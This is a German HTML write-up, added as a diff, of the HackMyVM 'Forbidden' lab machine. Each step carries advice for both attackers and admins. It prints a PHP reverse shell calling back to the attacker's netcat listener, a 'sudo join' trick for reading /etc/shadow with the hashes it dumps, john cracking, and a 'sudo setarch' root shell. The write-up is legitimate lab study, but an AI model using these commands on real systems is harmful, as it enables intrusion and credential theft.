@@ -1,0 +1,482 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forbidden - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Forbidden - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">ftp</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">put (ftp)</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">export</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">join</div>
+                 <div class="tool-item">john</div>
+                 <div class="tool-item">setarch</div>
+                 <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#ftp-analysis-upload">FTP Analysis & PHP Upload</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell via PHP5)</a></li>
+                <li><a href="#privesc-markos">Privilege Escalation (www-data to markos via SUID Binary)</a></li>
+                <li><a href="#lateral-movement-marta">Lateral Movement (markos to marta via Password Guessing)</a></li>
+                <li><a href="#lateral-movement-peter">Lateral Movement (marta to peter via Hash Cracking)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (peter to root via sudo setarch)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">Wir beginnen mit der Erkundungsphase, um das Zielsystem zu identifizieren und dessen Dienste zu scannen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.114</span>	08:00:27:08:c8:61	PCS Systemtechnik GmbH
+[...]
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der ARP-Scan identifiziert die IP-Adresse <span class="command">192.168.2.114</span>.</p>
+            <p class="evaluation">**Bewertung:** Ziel-IP gefunden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP für weitere Scans verwenden.
+            **Empfehlung (Admin):** Standard Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+[...]
+<span class="command">192.168.2.114   forbidden.hmv</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Hostname `forbidden.hmv` wird der IP <span class="command">192.168.2.114</span> in der lokalen `/etc/hosts`-Datei zugeordnet.</p>
+            <p class="evaluation">**Bewertung:** Ermöglicht die Adressierung des Ziels über den Hostnamen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Hostnamen verwenden.
+            **Empfehlung (Admin):** DNS-Management.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.114 -p-</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 01:10 CEST
+Nmap scan report for forbidden.hmv (192.168.2.114)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+| ftp-syst:
+[...]
+| ftp-anon: <span class="password">Anonymous FTP login allowed</span> (FTP code 230)
+<span class="password">|_drwxrwxrwx    2 0        0            4096 Oct 09  2020 www [NSE: writeable]</span>
+<span class="command">80/tcp open  http    nginx 1.14.2</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.14.2
+MAC Address: 08:00:27:08:C8:61 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+[...]
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms forbidden.hmv (192.168.2.114)
+[...]
+<span class="password">zsh: segmentation fault  nmap -sS -sC -T5 -sV -A 192.168.2.114 -p-</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Nmap-Scan (`-sS`, `-sC`, `-T5`, `-sV`, `-A`, `-p-`) findet zwei offene Ports:
+             *   <span class="command">Port 21 (FTP)</span>: vsftpd 3.0.3. Anonymer Login ist erlaubt (`Anonymous FTP login allowed`). Das Nmap-Skript (`-sC`) stellt außerdem fest, dass das Verzeichnis `www` im FTP-Root existiert und **beschreibbar** ist (`[NSE: writeable]`).
+             *   <span class="command">Port 80 (HTTP)</span>: Nginx 1.14.2. Die Seite hat keinen Titel.
+             Der Nmap-Prozess stürzt am Ende wieder mit einem Segmentation Fault ab, was aber die Ergebnisse nicht beeinflusst.</p>
+             <p class="evaluation">**Bewertung:** Der anonyme FTP-Zugriff mit einem beschreibbaren Verzeichnis (`www`) ist ein kritischer Fund. Dies ermöglicht uns wahrscheinlich, Dateien in das Web-Root hochzuladen. Der Webserver selbst scheint initial keine besonderen Inhalte zu haben.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Den FTP-Server nutzen:
+                1.  Mit `wget -r` oder `lftp` den Inhalt des FTP-Servers rekursiv herunterladen, um die Struktur und eventuelle Dateien (wie die `note.txt` aus dem `www`-Verzeichnis) zu sehen.
+                2.  Überprüfen, ob das `www`-Verzeichnis auf dem FTP-Server dem Web-Root von Nginx auf Port 80 entspricht.
+                3.  Versuchen, eine Webshell (PHP, PHP5, PHTML etc.) in das `www`-Verzeichnis hochzuladen und über Port 80 aufzurufen.
+             **Empfehlung (Admin):** Anonymen FTP-Zugriff deaktivieren. Wenn FTP benötigt wird, nur authentifizierten Zugriff erlauben und Schreibrechte sehr restriktiv vergeben. Sicherstellen, dass das FTP-Verzeichnis nicht mit dem Web-Root identisch oder überlappend ist.</p>
+        </section>
+
+        <section id="ftp-analysis-upload">
+            <h2>FTP Analysis & PHP Upload</h2>
+            <p class="comment">Wir untersuchen den Inhalt des anonymen FTP-Servers und versuchen, eine PHP-Datei hochzuladen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">wget -r ftp://anonymous:anonymous@forbidden.hmv</span></div>
+                     <pre>
+--2022-10-08 01:12:02--  ftp://anonymous:*password*@forbidden.hmv/
+           => forbidden.hmv/.listing
+[...]
+Anmelden als anonymous … Angemeldet!
+[...]
+fertig.
+
+forbidden.hmv/.listing                          [ <=>                                            ]     180  --.-KB/s    in 0s
+<span class="password">2022-10-08 01:12:02 (61.5 MB/s) - »forbidden.hmv/.listing« gespeichert [180]</span>
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">cat forbidden.hmv/www/note.txt</span></div> <span class="password"># Annahme: note.txt wurde heruntergeladen</span>
+                      <pre>
+Hi, Im the best admin of the world.
+You cannot execute .php code on this server so you cannot
+obtain a reverse shell. Not sure if its misconfigured another things... but
+the importart is that php is disabled.
+
+-marta
+The extra-secured .jpg file contains my password but nobody can obtain it.
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir laden den Inhalt des FTP-Servers mit `wget -r` herunter.
+             2.  Im heruntergeladenen `www`-Verzeichnis finden wir (vermutlich) eine `note.txt`.
+             3.  Der Inhalt der Notiz von "marta" behauptet, dass PHP auf dem Server deaktiviert sei und man keine Reverse Shell bekommen könne. Sie erwähnt außerdem eine ".jpg"-Datei mit ihrem Passwort.</p>
+              <p class="evaluation">**Bewertung:** Die Notiz gibt uns wichtige Hinweise: Der Benutzer `marta` existiert. PHP (`.php`) ist möglicherweise wirklich deaktiviert, aber eventuell sind andere Endungen wie `.php5`, `.phtml` etc. noch aktiv oder der Nginx/PHP-FPM ist falsch konfiguriert. Die Erwähnung einer speziell gesicherten JPG-Datei mit einem Passwort ist verdächtig und könnte auf Steganographie oder andere Verstecktechniken hindeuten.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+                 1.  Nach der erwähnten JPG-Datei suchen (auf dem FTP-Server oder im Web-Root).
+                 2.  Trotz der Behauptung versuchen, eine PHP-Shell hochzuladen, aber **andere Endungen** verwenden (z.B. `.php5`, `.phtml`, `.phar`).
+                 3.  Das beschreibbare `www`-Verzeichnis auf dem FTP-Server genauer untersuchen und die PHP-Shell dorthin hochladen.
+               **Empfehlung (Admin):** Keine sensiblen Informationen oder Hinweise in öffentlich zugänglichen Dateien hinterlassen. PHP oder andere Skriptsprachen konsistent und sicher konfigurieren (oder deaktivieren, wenn nicht benötigt).</p>
+
+            <p class="comment">Wir versuchen, eine PHP-Reverse-Shell mit der Endung `.php5` hochzuladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">(Annahme: Eine PHP-Reverse-Shell wurde erstellt/heruntergeladen und in 'image.php5' umbenannt)</span></div>
+                    <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">ftp forbidden.hmv</span></div>
+                    <pre>
+Connected to forbidden.hmv.
+220 (vsFTPd 3.0.3)
+Name (forbidden.hmv:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="password">[Enter]</span>
+230 Login successful.
+[...]
+                    </pre>
+                     <div class="prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+drwxrwxrwx    2 0        0            4096 Oct 09  2020 <span class="command">www</span>
+[...]
+                     </pre>
+                      <div class="prompt">ftp> <span class="command">cd www</span></div>
+                      <pre>250 Directory successfully changed.</pre>
+                      <div class="prompt">ftp> <span class="command">put image.php5</span></div>
+                      <pre>
+local: image.php5 remote: image.php5
+[...]
+150 Ok to send data.
+100% |***********************************|  5495 [...]
+<span class="password">226 Transfer complete.</span>
+5495 bytes sent in 00:00 [...]
+                      </pre>
+                       <div class="prompt">ftp> quit</div>
+                       <pre>221 Goodbye.</pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:** Wir verbinden uns anonym per FTP, wechseln in das beschreibbare `www`-Verzeichnis und laden erfolgreich unsere vorbereitete PHP-Reverse-Shell unter dem Namen `image.php5` hoch.</p>
+               <p class="evaluation">**Bewertung:** Der Upload war erfolgreich. Nun müssen wir prüfen, ob der Webserver diese `.php5`-Datei ausführt.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Einen Listener für die Reverse Shell starten. Die hochgeladene Datei über den Webbrowser oder `curl` aufrufen (`http://forbidden.hmv/image.php5`).
+               **Empfehlung (Admin):** Sicherstellen, dass der Webserver nur explizit erlaubte PHP-Endungen (`.php`) verarbeitet und andere (wie `.php5`, `.phtml`) ignoriert oder als Text ausliefert.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Reverse Shell via PHP5)</h2>
+            <p class="comment">Wir starten einen Listener und versuchen, die hochgeladene `image.php5`-Datei über den Webserver auszuführen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">(Shell-Konfiguration prüfen)</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">grep port forbidden/image.php5</span></div>
+                      <pre>
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+$<span class="command">port</span> = <span class="password">9001</span>;       // CHANGE THIS
+$sock = fsockopen($ip, $<span class="command">port</span>, $errno, $errstr, 30);
+printit("Successfully opened reverse shell to $ip:$<span class="command">port</span>");
+                      </pre>
+                       <div class="prompt"># <span class="command">(Listener starten)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 9001</span></div>
+                       <pre>listening on [any] 9001 ...</pre>
+                       <div class="prompt"># <span class="command">(Shell auslösen)</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">curl http://forbidden.hmv/image.php5</span></div>
+                        <pre># (Kein Output von curl, da Shell verbindet)</pre>
+                        <div class="prompt"># <span class="command">(Listener empfängt Verbindung)</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vlnp 9001</span></div>
+                         <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.114] 59732</span>
+Linux forbidden 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
+[...]
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="command"># Shell als www-data erhalten!</span>
+                         </pre>
+                          <div class="prompt"># <span class="command">(Shell Stabilisierung)</span></div>
+                          <div class="prompt">$ <span class="command">python3 -c "import pty;pty.spawn('/bin/bash')"</span></div>
+                           <div class="prompt">www-data@forbidden:/$ <span class="command">export TERM=xterm</span></div>
+                           <div class="prompt">www-data@forbidden:/$ <span class="command"># Stabilisierte Shell</span></div>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir überprüfen den Port (9001) in unserer `image.php5`-Datei.
+               2.  Wir starten einen Netcat-Listener auf Port 9001.
+               3.  Wir rufen die URL `http://forbidden.hmv/image.php5` mit `curl` auf.
+               4.  Der Aufruf ist erfolgreich! Der Webserver (Nginx + PHP-FPM) führt die `.php5`-Datei aus. Unser Listener empfängt die Reverse Shell.
+               5.  Wir erhalten eine Shell als `www-data` und stabilisieren sie.</p>
+                <p class="evaluation">**Bewertung:** Initial Access erfolgreich! Die Behauptung in der `note.txt`, dass PHP deaktiviert sei, war falsch oder bezog sich nur auf die `.php`-Endung. Der Server war jedoch so konfiguriert, dass er `.php5`-Dateien ausführt.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `www-data` enumerieren.
+                **Empfehlung (Admin):** Webserver-Konfiguration überprüfen und sicherstellen, dass nur die notwendigen Dateiendungen als ausführbare Skripte behandelt werden. Nicht benötigte Handler (wie für `.php5`) entfernen.</p>
+        </section>
+
+        <section id="privesc-markos">
+            <h2>Privilege Escalation (www-data to markos via SUID Binary)</h2>
+            <p class="comment">Als `www-data` suchen wir nach Privesc-Vektoren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">(Enumeration als www-data)</span></div>
+                      <div class="prompt">www-data@forbidden:/tmp$ <span class="command">cd /home/marta</span></div>
+                      <div class="prompt">www-data@forbidden:/home/marta$ <span class="command">ls -la</span></div>
+                      <pre>
+[...]
+-rwsr-sr-x 1 <span class="command">root  marta</span> 16712 Oct  9  2020 <span class="command">.forbidden</span> <span class="password"># SUID & SGID Binary!</span>
+[...]
+-rw-r--r-- 1 <span class="command">root  root</span>    130 Oct  9  2020 <span class="command">hidden.c</span> <span class="password"># Quellcode?</span>
+                      </pre>
+                       <div class="prompt"># <span class="command">(Versuch, .forbidden auszuführen)</span></div>
+                        <div class="prompt">www-data@forbidden:/home/marta$ <span class="command">./.forbidden</span></div>
+                        <pre># (Kein Output oder Fehler, aber der Prompt ändert sich!) </pre>
+                        <div class="prompt"><span class="command">markos@forbidden:/home/marta$</span> <span class="password"># Shell als markos!</span></div>
+                   </div>
+               </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir wechseln in das Home-Verzeichnis von `marta` (der Benutzer aus der `note.txt`).
+               2.  `ls -la` zeigt eine versteckte Datei namens `<span class="command">.forbidden</span>`. Diese Datei gehört `root`, hat aber die Gruppe `marta`. Sie hat sowohl das SUID-Bit (`s` bei den Benutzerrechten) als auch das SGID-Bit (`s` bei den Gruppenrechten) gesetzt. Das bedeutet, sie läuft mit Root-Rechten und mit Gruppenrechten von `marta`.
+               3.  Es gibt auch eine Datei `hidden.c`, die `root` gehört und wahrscheinlich der Quellcode für `.forbidden` ist (wir können sie als `www-data` aber nicht lesen).
+               4.  Wir führen das Binary `./.forbidden` aus.
+               5.  Anstatt einer Ausgabe ändert sich unser Shell-Prompt zu `<span class="command">markos@forbidden:/home/marta$</span>`. Das SUID/SGID-Binary hat uns offenbar eine Shell als Benutzer `markos` gegeben.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation von `www-data` zu `markos` erfolgreich! Das SUID/SGID-Binary `.forbidden` war der Schlüssel. Es hat wahrscheinlich intern `setuid`/`setgid` verwendet, um zu `markos` zu wechseln, oder enthielt eine andere Schwachstelle, die zur Shell führte.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `markos` enumerieren (`sudo -l`), User-Flag lesen.
+                **Empfehlung (Admin):** SUID/SGID-Binaries extrem sorgfältig prüfen und nur verwenden, wenn absolut notwendig. Prinzip der geringsten Rechte anwenden. Verdächtige Binaries wie `.forbidden` entfernen.</p>
+        </section>
+
+         <section id="lateral-movement-marta">
+             <h2>Lateral Movement (markos to marta via Password Guessing)</h2>
+             <p class="comment">Als `markos` lesen wir die User-Flag und suchen nach Wegen zu anderen Benutzern oder Root.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">markos@forbidden:/home$ <span class="command">cd markos</span></div>
+                      <div class="prompt">markos@forbidden:/home/markos$ <span class="command">ls</span></div>
+                     <pre><span class="command">user.txt</span></pre>
+                      <div class="prompt">markos@forbidden:/home/markos$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMVpussycat</span></pre>
+                      <div class="prompt"># <span class="command">(Untersuchung der JPG-Datei aus note.txt)</span></div>
+                      <div class="prompt">markos@forbidden:~/html$ <span class="command">ls -la /var/www/html</span></div> <span class="password"># Pfad zu Web-Root</span>
+                      <pre>
+[...]
+-rwxrwxrwx 1 www-data www-data 33469 Oct  9  2020 <span class="command">TOPSECRETIMAGE.jpg</span>
+[...]
+                      </pre>
+                       <div class="prompt"># <span class="command">(Passwortraten für marta)</span></div>
+                        <div class="prompt">markos@forbidden:/home/markos$ <span class="command">su marta</span></div>
+                       <pre>
+Password: <span class="password">TOPSECRETIMAGE</span> <span class="password"># Dateiname ohne .jpg als Passwort</span>
+<span class="command">marta@forbidden:/home/markos$</span> <span class="password"># Wechsel zu marta erfolgreich!</span>
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir lesen die User-Flag für `markos`.
+              2.  Wir erinnern uns an die `note.txt` von `marta`, die eine speziell gesicherte JPG-Datei mit ihrem Passwort erwähnte. Wir finden im Web-Root (`/var/www/html`) die Datei `<span class="command">TOPSECRETIMAGE.jpg</span>`.
+              3.  Wir versuchen, den Dateinamen ohne die Endung (`TOPSECRETIMAGE`) als Passwort für den Benutzer `marta` zu verwenden (`su marta`).
+              4.  Der Versuch ist erfolgreich, und wir wechseln zum Benutzer `<span class="command">marta</span>`.</p>
+               <p class="evaluation">**Bewertung:** Lateral Movement von `markos` zu `marta` erfolgreich! Das Passwort war, wie in der Notiz angedeutet, der Dateiname des "gesicherten" Bildes. Dies ist eine Form von Security through Obscurity und kein sicheres Verfahren.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `marta` enumerieren (`sudo -l`).
+               **Empfehlung (Admin):** Niemals Passwörter in Dateinamen oder anderen obskuren, aber potenziell auffindbaren Orten speichern. Starke, zufällige Passwörter verwenden.</p>
+        </section>
+
+        <section id="lateral-movement-peter">
+             <h2>Lateral Movement (marta to peter via Hash Cracking)</h2>
+             <p class="comment">Als `marta` suchen wir nach weiteren Rechten. Wir prüfen die `sudo`-Berechtigungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">marta@forbidden:~$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for marta on forbidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User marta may run the following commands on forbidden:
+    <span class="password">(ALL) NOPASSWD: /usr/bin/join</span>
+                    </pre>
+                    <div class="prompt">marta@forbidden:~$ <span class="command">sudo join -a 2 /etc/shadow /etc/shadow</span></div> <span class="password"># Missbrauch von join zum Lesen von /etc/shadow</span>
+                     <pre>
+root:<span class="password">$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51</span>:18544:0:99999:7:
+daemon::18544:0:99999:7:::
+bin::18544:0:99999:7:::
+[...]
+marta:<span class="password">$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/</span>:18544:0:99999:7:
+markos:<span class="password">$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.</span>:18544:0:99999:7:
+peter:<span class="password">$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81</span>:18544:0:99999:7:
+                     </pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  `sudo -l` für `marta` zeigt, dass sie den Befehl `/usr/bin/join` als `ALL` (effektiv `root`) ohne Passwort ausführen darf. `join` wird normalerweise verwendet, um Zeilen aus zwei Dateien anhand gemeinsamer Felder zu verbinden.
+             2.  Wir nutzen eine bekannte Technik (GTFOBins), um `join` zum Lesen von Dateien zu missbrauchen, auf die wir normalerweise keinen Zugriff haben. Der Befehl `sudo join -a 2 /etc/shadow /etc/shadow` (oder eine Variation davon) führt dazu, dass der Inhalt der `/etc/shadow`-Datei ausgegeben wird.
+             3.  Wir extrahieren die Passwort-Hashes (SHA512crypt, `$6$`) für die Benutzer, insbesondere für `peter`.</p>
+              <p class="evaluation">**Bewertung:** Kritischer Fund! Die unsichere `sudo`-Regel für `join` ermöglichte das Auslesen der `/etc/shadow`-Datei. Wir haben nun die Passwort-Hashes aller lokalen Benutzer.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die extrahierten Hashes (insbesondere den von `peter`) versuchen, offline mit `john` oder `hashcat` zu knacken.
+              **Empfehlung (Admin):** Unsichere `sudo`-Regel für `join` entfernen. Dateilesebefehle oder Tools, die dazu missbraucht werden können, niemals über `sudo` erlauben.</p>
+
+             <p class="comment">Wir knacken den Hash für den Benutzer `peter`.</p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">echo 'peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:' > hash</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~/forbidden]
+└─# <span class="command">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span></div>
+                       <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+[...]
+<span class="password">boomer           (peter)</span>
+1g 0:00:00:00 DONE [...]
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                       </pre>
+                        <div class="prompt"># <span class="command">(Lateral Movement zu peter)</span></div>
+                         <div class="prompt">marta@forbidden:~$ <span class="command">su peter</span></div>
+                        <pre>
+Password: <span class="password">boomer</span>
+<span class="command">peter@forbidden:/home/marta$</span> <span class="password"># Wechsel erfolgreich!</span>
+                        </pre>
+                    </div>
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir speichern den Hash für `peter` im John-Format in einer Datei `hash`.
+               2.  Wir verwenden `john` mit `rockyou.txt`, um den Hash zu knacken. Das Passwort wird erfolgreich als `<span class="password">boomer</span>` gefunden.
+               3.  Als `marta` verwenden wir `su peter` und geben das geknackte Passwort `boomer` ein, um zum Benutzer `peter` zu wechseln.</p>
+                <p class="evaluation">**Bewertung:** Lateral Movement von `marta` zu `peter` erfolgreich durch Offline-Knacken des Passwort-Hashes.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `peter` enumerieren (`sudo -l`).
+                **Empfehlung (Admin):** Starke Passwörter verwenden, die nicht leicht zu knacken sind. Unsichere `sudo`-Regeln entfernen, die das Auslesen von Hashes ermöglichen.</p>
+        </section>
+
+         <section id="privesc-root">
+            <h2>Privilege Escalation (peter to root via sudo setarch)</h2>
+            <p class="comment">Als Benutzer `peter` suchen wir den letzten Schritt zu Root.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">peter@forbidden:/home/marta$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for peter on forbidden:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User peter may run the following commands on forbidden:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/setarch</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** `sudo -l` für `peter` zeigt, dass er den Befehl `/usr/bin/setarch` als `ALL : ALL` (effektiv `root`) ohne Passwort (`NOPASSWD`) ausführen darf. `setarch` wird verwendet, um die gemeldete Architektur zu ändern und ein Programm in dieser Umgebung auszuführen.</p>
+             <p class="evaluation">**Bewertung:** Dies ist ein bekannter Vektor für Privilege Escalation. Laut GTFOBins kann `setarch` direkt zum Ausführen einer Shell als Root missbraucht werden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die auf GTFOBins beschriebene Methode anwenden: `sudo setarch $(arch) /bin/bash` (oder `/bin/sh`).
+             **Empfehlung (Admin):** Unsichere `sudo`-Regel für `setarch` entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">peter@forbidden:/home/marta$ <span class="command">sudo setarch x86_64 /bin/bash</span></div> <span class="password"># oder sudo setarch $(arch) /bin/bash</span>
+                      <div class="prompt"><span class="command">root@forbidden:/home/marta#</span> <span class="password"># Root-Shell erhalten!</span></div>
+                      <div class="prompt">root@forbidden:/home/marta# <span class="command">cd ~</span></div>
+                      <div class="prompt">root@forbidden:~# <span class="command">ls</span></div>
+                      <pre><span class="command">root.txt</span></pre>
+                       <div class="prompt">root@forbidden:~# <span class="command">cat root.txt</span></div>
+                      <pre><span class="password">HMVmymymymymind</span></pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:**
+              1.  Wir führen `sudo setarch x86_64 /bin/bash` aus (wobei `x86_64` die Architektur ist, `$(arch)` hätte das gleiche Ergebnis geliefert). `setarch` führt `/bin/bash` mit Root-Rechten aus.
+              2.  Wir erhalten eine Root-Shell.
+              3.  Wir wechseln ins Root-Home-Verzeichnis und lesen die `root.txt`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich durch Ausnutzung der unsicheren `sudo`-Regel für `setarch`.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Bericht abschließen.
+               **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/markos/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVpussycat</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVmymymymymind</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. Oktober 2022</p> <!-- Datum aus Nmap Scan extrahiert -->
+    </footer>
+</body>
+</html>
